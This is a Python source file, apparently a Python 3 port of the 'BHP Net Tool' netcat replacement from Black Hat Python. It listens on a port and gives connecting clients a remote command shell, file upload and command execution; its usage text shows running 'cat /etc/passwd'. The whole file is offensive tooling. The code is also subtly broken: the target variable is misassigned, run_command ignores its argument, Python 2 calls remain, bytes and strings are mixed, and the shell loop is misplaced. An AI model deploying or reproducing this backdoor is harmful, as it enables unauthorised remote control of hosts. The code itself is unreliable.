import sys
import socket
import getopt
import threading
import subprocess


"""
The code is working correctly, but still needs
some adjustments. The file upload function is not
working properly. I spent two day rewrinting this code
from Python2 to Python3 and encountered several compatibility
issues, so I will leave this little upload problem to fix later.
"""


# Define some global variables

LISTEN = False
COMMAND = False
UPLOAD = False
EXECUTE = ""
TARGET = ""
UPLOAD_DESTINATION = ""
PORT = 0

def usage(): # HELP PAINEL
	print("BHP Net Tool\n")
	print("Usage: bhpnet.py -t target_host -p port\n")
	print("""-l --listen
	- listen on [host]:[port] for
	incoming connections""")

	print("""-e --execute=file_to_run - execute the given file upon ¬
		receiving a connection""")
	print ("""-c --command
		- initialize a command shell""")
	print("""-u --upload=destination - upon receiving connection upload a
		file and write to [destination]""")
	
	print("""Examples:
	 bhpnet.py -t 192.168.0.1 -p 5555 -l -c
	 bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:target.exe
	 bhpnet.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd
	 echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135 """)
	
	sys.exit(0)


def main():
	global LISTEN,TARGET, PORT
	global EXECUTE, COMMAND, UPLOAD_DESTINATION


	if not len(sys.argv[1:]):
		# usage()
		pass

	# Read the commandline options
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
		["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print(err)
		usage()


	for o, a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-l", "--listen"):
			LISTEN = True
		elif o in ("-e", "--execute"):
			EXECUTE = a
		elif o in ("-c", "--commandshell"):
			COMMAND = True
		elif o in ("-u", "--upload"):
			UPLOAD_DESTINATION = a
		elif o in ("-t", "--target"):
			target = a
		elif o in ("-p", "--port"):
			PORT = int(a)
		else:
			raise ValueError("Unhadled Option")
	# Are we gaing to listen or just send data from stdin?
	if (not LISTEN) and TARGET and (PORT > 0):
		# Read in the buffer from the commandline
		# This will block, so send CTRL-D if not sending input
		# To stdin
		buffer = sys.stdin.read()
		print(buffer)

		# Send data off
		client_sender(buffer)

	# We are going to listen and portentially
	# Upload things, execute commands, and trop a shell back
	# Depending on our command line options above
	if(LISTEN):
		server_loop()



def client_sender(buffer):
	global TARGET, PORT

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		# Connect to our target host
		client.connect((TARGET, PORT))

		if len(buffer):
			client.send(buffer)

		while True:

			# Now wait for data back
			recv_len = 1
			response = ""

			while recv_len:

				data = client.recv(4096)
				recv_len = len(data)

				response += data

				if recv_len < 4096:
					break
			print(response)

			# Wait for more input
			buffer = raw_input("")
			buffer += "\n"

			# Send it off
			client.send(buffer)
	except:
		print("[*] Exception Exting..")
		# Tear down the connection
		client.close()

def server_loop():
	global TARGET, PORT
	try:
		# Ifo no TARGET is defined, we listen on all interfaces
		if not len(TARGET):
			TARGET = "0.0.0.0"

		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server.bind((TARGET, PORT))
		server.listen(5)

		while True:
			client_socket, addr = server.accept()

			# Spin off a thread to handle our new client
			client_thread = threading.Thread(target=client_handler, args=(client_socket,))
			client_thread.start()
	except KeyboardInterrupt as error:
		server.close()
		exit(0)


def run_command(command):
	# Trim the newline
	command = COMMAND.rstrip()

	# Run the command and get the output back
	try:
		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
	except:
		print("Failed to execute command.\r\n")

	# Send the output back to the client
	return output


def client_handler(client_socket):
	global UPLOAD
	global EXECUTE
	global COMMAND
	global UPLOAD_DESTINATION

	try:
		# Check for upload
		if len(UPLOAD_DESTINATION):
			file_buffer = ""

			# Keep reading data until none is available
			while True:
				data = client_socket.recv(1024)

				if not data:
					break
				else:
					file_buffer += data.encode()

			# Now we take these Bytes and try to write them out
			try:
				with open(UPLOAD_DESTINATION, 'wb') as file_descriptor:
					file_descriptor.write(file_buffer)

					# Acknowledge that we wrote the file out
					client_socket.send("Successfully saved file to %s\r\n" % UPLOAD_DESTINATION).encode()
			except Exception as error:
				client_socket.send("Failed to saved file to %s\r\n" % UPLOAD_DESTINATION).encode()

			# Check for command execution
			if len(EXECUTE):
				# Run the command
				output = run_command(EXECUTE)

				client_socket.send(output.encode())

			# Now we go into another loop if a command shell was requested
			if COMMAND:

				while True:
					# Show a simple prompt
					client_socket.send("<BHP:#> ".encode())

					# Now we receive until we see a linefeed (enter-key)
					cmd_buffer = ""
					while "\n" not in cmd_buffer:
						cmd_buffer += client_socket.recv(1024)

					# Send back the command output
					response = run_command(cmd_buffer)

					# Send back the response
					client_socket.send(response.encode())
	except KeyboardInterrupt as error:
		exit(0)


if __name__ == "__main__":
	main()